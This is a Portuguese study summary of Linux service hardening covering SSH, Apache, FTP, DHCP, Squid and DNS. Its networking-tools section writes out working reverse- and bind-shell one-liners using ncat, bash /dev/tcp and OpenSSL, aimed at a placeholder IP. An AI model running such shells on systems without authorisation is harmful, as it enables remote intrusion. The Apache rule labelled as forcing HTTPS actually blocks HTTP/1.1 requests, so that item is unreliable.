
## 🛡️ Resumo: Hardening em Sistemas Linux – Aplicações e Serviços

### 📌 Objetivo Geral
- Aprender técnicas de **hardening de aplicações e serviços** em servidores Linux.
- Foco em: **SSH**, **Apache**, **DHCP**, **Proxy (Squid)**, **DNS (BIND)**, e ferramentas como **Ncat** e **OpenSSL**.

---

## 🔐 1. Secure Shell (SSH) – Hardening e Controles

### 🔑 Componentes do SSH
- **SSH-TRANS**: Camada de transporte (autenticação, confidencialidade, integridade).
- **SSH-USERAUTH**: Autenticação do usuário.
- **SSH-CONNECT**: Multiplexação de canais lógicos.

### 🔒 Autenticação
- **Chaves SSH** são mais seguras que usuário/senha.
- Comando para gerar chaves: `ssh-keygen`
- Copiar chave para o servidor: `ssh-copy-id -i id_rsa.pub user@IP`
- Desabilitar autenticação por senha:
  ```bash
  # /etc/ssh/sshd_config
  PasswordAuthentication no
  ```

### 📁 Transferência Segura de Arquivos
- **SFTP**: `sftp -i chave user@host`
- **SCP**: `scp arquivo user@host:/caminho`

### 🔄 Tipos de Shell
- **Bind Shell**: Cliente conecta ao servidor para executar comandos.
- **Reverse Shell**: Servidor conecta ao cliente para executar comandos.

### 🚇 SSH Tunneling (Port Forwarding)
- **Local**: `ssh -L local_port:remote_host:remote_port user@gateway`
- **Reverse**: `ssh -R remote_port:local_host:local_port user@gateway`
- **Dynamic**: `ssh -D local_port user@gateway` (SOCKS proxy)

### ⚙️ Controles no `sshd_config`
- `PermitRootLogin no`
- `Port 2222` (alterar porta padrão)
- `AllowUsers user1 user2`

---

## 🛠️ 2. Ferramentas de Rede e Segurança

### 🔍 Ncat (Netcat moderno)
- **Verificar portas**: `ncat -nv IP porta`
- **Banner grabbing**: `ncat -nv IP 22` ou enviar dados aleatórios
- **Transferência de arquivos**:
  - Servidor: `ncat -lvnp 8080 > arquivo`
  - Cliente: `cat arquivo | ncat -vn IP 8080`
- **Shell reverso**:
  - Servidor: `ncat -lvnp 8080`
  - Cliente: `ncat -e /bin/bash -vn IP 8080`

### 🔐 OpenSSL para Shells
- **Gerar certificado**:
  ```bash
  openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
  ```
- **Bind Shell com OpenSSL** (via FIFO):
  ```bash
  mkfifo /tmp/fifo
  cat /tmp/fifo | /bin/sh -i 2>&1 | openssl s_server -quiet -key key.pem -cert cert.pem -port 4443 > /tmp/fifo
  ```

### 💻 Bash Sockets
- **Verificar porta**: `echo -n < /dev/tcp/IP/porta && echo "Aberta"`
- **Cliente TCP**:
  ```bash
  exec 3<>/dev/tcp/IP/porta
  echo "dados" >&3
  cat <&3
  ```
- **Shell reverso**: `/bin/bash -i > /dev/tcp/IP/porta 0<&1 2>&1`

---

## 🌐 3. Hardening do Apache HTTP Server

### 🧱 Instalação e Controles Básicos
- **Instalação**: `apt install apache2`
- **Diretório raiz**: `/var/www/html`
- **Arquivo de configuração**: `/etc/apache2/apache2.conf`

### 🔒 Ocultar Informações do Servidor
```apache
ServerTokens Prod
ServerSignature Off
TraceEnable Off
FileETag None
```

### 📂 Controle de Diretórios
```apache
<Directory /var/www/html>
    Options -Indexes -Includes -ExecCGI
    AllowOverride None
    Require all granted
</Directory>
```

### 🛡️ Proteções Adicionais
- **Limitar tamanho de requisições**:
  ```apache
  LimitRequestBody 512000
  ```
- **Headers de segurança**:
  ```apache
  Header edit Set-Cookie ^(.*)$ $1;HttpOnly;Secure
  Header always append X-Frame-Options SAMEORIGIN
  Header set X-XSS-Protection "1; mode=block"
  ```
- **Forçar HTTPS** (rewrite):
  ```apache
  RewriteEngine On
  RewriteCond %{THE_REQUEST} HTTP/1.1$
  RewriteRule .* - [F]
  ```

### 🔐 SSL/TLS
- **Desabilitar SSL**, usar apenas TLS:
  ```apache
  SSLProtocol -all +TLSv1.2
  ```
- **Cifras seguras**:
  ```apache
  SSLCipherSuite HIGH:!MEDIUM:!aNULL:!MD5:!RC4
  ```

### 📊 Logs
- **Acesso**: `/var/log/apache2/access.log`
- **Erros**: `/var/log/apache2/error.log`
- **Monitoramento**: `tail -f /var/log/apache2/error.log`

---

## 🌐 4. Serviço FTP com ProFTPD + TLS

### 📥 Instalação e Configuração
- `apt install proftpd`
- **Gerar certificado**:
  ```bash
  openssl req -x509 -nodes -newkey rsa:2048 -keyout /etc/ssl/private/proftpd.pem -out /etc/ssl/private/proftpd.pem -days 365
  ```
- **Habilitar TLS** em `/etc/proftpd/tls.conf`:
  ```apache
  TLSEngine on
  TLSProtocol TLSv1.2
  TLSRSACertificateFile /etc/ssl/private/proftpd.pem
  TLSRSACertificateKeyFile /etc/ssl/private/proftpd.pem
  ```

---

## 🌐 5. Servidor DHCP (ISC DHCP Server)

### 📦 Instalação e Configuração
- `apt install isc-dhcp-server`
- **Arquivo de configuração**: `/etc/dhcp/dhcpd.conf`
- **Interface**: `INTERFACESv4="eth0"` em `/etc/default/isc-dhcp-server`

### ⚙️ Exemplo de Pool
```apache
subnet 192.168.60.0 netmask 255.255.255.0 {
    range 192.168.60.50 192.168.60.100;
    option routers 192.168.60.1;
    option domain-name-servers 8.8.8.8;
    default-lease-time 3600;
    max-lease-time 86400;
}
```

### � Reserva de IP
```apache
host SERVIDOR {
    hardware ethernet 00:0c:19:bc:2e:e1;
    fixed-address 192.168.60.10;
}
```

### 📊 Logs
- `tail -f /var/log/syslog`

---

## 🌐 6. Servidor Proxy – Squid

### 🚀 Instalação e Configuração
- `apt install squid`
- **Arquivo de configuração**: `/etc/squid/squid.conf`

### ⚙️ Parâmetros Principais
```apache
http_port 3128
visible_hostname proxy.local
cache_mem 64 MB
access_log /var/log/squid/access.log
```

### 👤 Autenticação
- **Criar usuário**: `htpasswd -c /etc/squid/squid_passwd usuario`
- **Habilitar autenticação básica** no `squid.conf`

---

## 🌐 7. Servidor DNS – BIND9

### 📡 Instalação
- `apt install bind9 bind9-doc dnsutils`

### 🗂 Zonas de DNS
- **Arquivo de configuração**: `/etc/bind/named.conf.local`
- **Zona direta**: `db.curso.local`
- **Zona reversa**: `db.60.168.192`

### 🔁 Exemplo de Zona Direta
```apache
zone "curso.local" {
    type master;
    file "/etc/bind/db.curso.local";
};
```

### 🔄 Exemplo de Zona Reversa
```apache
zone "60.168.192.in-addr.arpa" {
    type master;
    file "/etc/bind/db.60.168.192";
};
```

### 🔍 Consultas Recursivas
- Configurar em `/etc/bind/named.conf.options`:
  ```apache
  allow-recursion { 192.168.60.0/24; };
  ```

### ✅ Testes
- `nslookup servidor.curso.local`
- `nslookup 192.168.60.100`

---

## ✅ Checklist de Hardening para Serviços Linux

### SSH
- [ ] Desativar autenticação por senha
- [ ] Alterar porta padrão
- [ ] Usar chaves criptográficas
- [ ] Limitar usuários com `AllowUsers`

### Apache
- [ ] Ocultar versão e banners
- [ ] Desativar índices de diretório
- [ ] Limitar tamanho de requisições
- [ ] Configurar headers de segurança
- [ ] Usar apenas TLS

### FTP
- [ ] Usar ProFTPD com TLS
- [ ] Certificado autoassinado ou CA

### DHCP
- [ ] Definir intervalos de IP
- [ ] Configurar tempo de lease
- [ ] Reservar IPs para servidores

### Proxy (Squid)
- [ ] Configurar autenticação
- [ ] Definir políticas de acesso
- [ ] Monitorar logs de acesso

### DNS (BIND)
- [ ] Configurar zonas direta e reversa
- [ ] Restringir consultas recursivas
- [ ] Validar configurações com `named-checkconf` e `named-checkzone`

---

## 🧠 Conclusão
- Hardening de serviços Linux é **essencial** para reduzir superfície de ataque.
- Cada serviço exige **configurações específicas** e **controles de acesso**.
- Uso de **chaves**, **criptografia**, **logs** e **políticas de mínimo privilégio** são fundamentais.
- Ferramentas como **Ncat**, **OpenSSL** e **Bash sockets** podem ser usadas tanto para administração quanto para testes de segurança.

---

## 🔗 Explore +
- **OpenSSH Security and Hardening** – linux-audit.com
- **How To Use SSH to Connect to a Remote Server** – DigitalOcean
- **Apache Web Server Hardening & Security Guide** – Geek Flare
- **Squid Documentation** – squid-cache.org
- **BIND9 Manual** – Internet Systems Consortium

---
